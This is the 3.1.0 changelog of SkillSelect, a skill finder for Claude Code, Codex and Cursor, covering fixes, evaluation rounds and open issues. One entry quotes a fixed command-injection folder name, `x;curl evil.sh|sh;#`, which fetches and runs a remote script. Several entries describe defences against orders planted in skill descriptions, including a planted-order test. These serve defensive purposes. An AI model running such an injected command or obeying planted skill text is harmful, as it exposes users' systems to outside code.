# Changelog

## 3.1.0

A check-up of 3.0.0 found ten flaws. Six are fixed and tested, one is fixed as far as a terminal can show, one fix helps but missed its bar, and two are open.

### Fixed
- **It counted skills you do not have.** 3.0.0 walked the whole plugin folder, so with 50 skills installed and one plugin list added it reported 107. It now reads Claude Code's own install record and the switched-on list. Skills in a switched-off plugin, or in a plugin list you added but never installed from, are shown apart with the line that gets them. Each skill carries its agent (Claude Code, Codex, Cursor).
- **The add line could carry a hidden command.** A folder named `x;curl evil.sh|sh;#` was printed unquoted. Every part is now quoted, and a folder or repository name with unusual characters gets no add line at all.
- **Text from skills reached the assistant unmarked.** Descriptions are now printed after `says:`, under a notice telling the assistant to treat them as information about the skill. Hidden characters and line breaks are removed. A GitHub skill whose text gives orders to the assistant is left out, and an installed one is flagged. On 6,414 public descriptions the check flagged 2: a poisoned test skill from a security scanner's own test folder (NVIDIA/SkillSpector), and one false alarm.
- **The short-answer sentence had no off switch.** `/skillselect short off`, `SKILLSELECT_SHORT=0`, and `/skillselect settings` to see the switches.
- **It ran out of GitHub calls fast without a login.** One request cost 11.5 API calls on average (60 an hour are free), and the answer came back empty once they were gone. A list of 4,136 public skills from 80 repositories now ships with SkillSelect. Without a login the finder opens at most 3 repositories live and takes the rest from the list: 2.8 calls a request on the same eight requests. When the allowance is gone, or the network is down, the list answers. `--offline` uses the list only.
- **No tests.** 81 tests, run on Python 3.9, 3.11 and 3.13, and a GitHub Actions file for Linux and macOS.
- **Claude Code only.** `pip install` gives a `skillselect` command for any terminal, the skill folder runs from `~/.codex/skills` or `~/.cursor/skills` (checked from a terminal, not inside those apps), and `--for codex|cursor` writes add lines for that agent's folder.

### New
- **Why a skill is listed.** Each one shows the words of your request it shares: `why: shares "landing page, html" with your request`.
- **Every other installed skill, one line each.** The finder prints them after its top list, so the assistant can catch a fit that shares no word with the request. See below.
- **The GitHub list got better, and works offline.** On 24 sealed requests 3.1 with a login kept 2.83 picks that do the job per request, against 2.04 for 3.0.0, at the same share (84% and 83%). Offline it kept 2.04 with no call to GitHub. These numbers are from the first judge, Claude Opus. See "Three more judges" below and `evidence/round12`.
- **A planted order.** Claude Opus did not obey it with either version (0 of 3 runs each). 3.1 warned the person in all 3 runs, and 3.0.0 said nothing. See `evidence/round13`.
- **Look-alike names.** A skill whose name mixes alphabets is left out of the GitHub list. One turned up among 6,414 public descriptions: a planted test case in NVIDIA/SkillSpector's test folder, with an order in its description. Skill files inside test folders are now skipped.
- **The finder no longer lists itself.**
- **Three more judges.** Claude Fable 5.2, Sonnet 5.5 and Haiku 5.5 judged the saved picks again. 3.1 with a login keeps more picks that do the job under all four judges (0.50 to 0.84 more per request). Under Fable and Sonnet a lower share of its picks do the job than of 3.0.0's (75% against 80%, 69% against 75%). The 88% of 3.0.0 is 86%, 71% and 95% under the three. See `evidence/round15`.
- **An unknown option is refused.** In 3.0.0 `--anything on` was read as a search for "on". It now prints the usage text.

### Found by a code review before release
- **A plugin's name could carry text to the assistant.** The name in a plugin's `plugin.json` was printed as written, also for a plugin list you had only added. A name with a line break put a line of its own into the answer. Only plain names are printed now.
- **A skill in an added plugin list that gives orders was shown without a warning.** It is left out now, like one on GitHub, and the finder says how many it left out.
- **One broken `plugin.json` stopped every request.** The finder skips that file and goes on.
- **An older install record gave 0 installed plugins.** A record whose entry is one object is read too.
- **A GitHub folder name was printed in the link as written.** The link is URL-quoted, and a skill whose folder name gives orders is left out.
- **With a login, a repository opened live lost its other skills from the shipped list.** The finder keeps them now. On the 24 sealed requests 79 of the 81 judged picks are still listed, and 12 skills are listed that no judge has seen (`evidence/round15/login_recheck.json`).
- **A plugin's templates and test files were counted as skills.** Only its `skills` folder, and the folders its manifest names, are read.
- **`CLAUDE_CONFIG_DIR` was ignored.** The finder reads that folder when it is set.
- **The add line failed for a second skill from the same repository.** It removes its own temporary folder first.
- **A mistyped `--for` name wrote add lines for Claude Code.** The finder refuses it, and `--help` prints the usage text.

### Missed its bar, kept because it still helps
- **Reading every installed skill.** The bar, set before the run, was 16 of 19 fits found on the sealed requests. It found 15 (3.0.0: 14). A second rule, set before the three other judges ran, asked whether it still finds more fits under them. It found 15 against 14 under Fable and Sonnet and 14 against 14 under Haiku, so it is always on. See `evidence/round11` and `evidence/round15`.

### Built and taken out
- **A hint on every message.** It named installed skills that fit before you asked. In a terminal test it named 9 skills on 36 requests and 8 were fits. It never ran in a live session and it would have run on every message for everyone, so it is not in 3.1.

### Not fixed
- **It does not start by itself.** Asked in plain words, Claude does not always start the finder.
- **The token and time numbers on the front page** still rest on one run without the plugin and three with it.
- **No person has labelled the test requests.** Four Claude models have: Opus, and in round 15 Fable, Sonnet and Haiku.
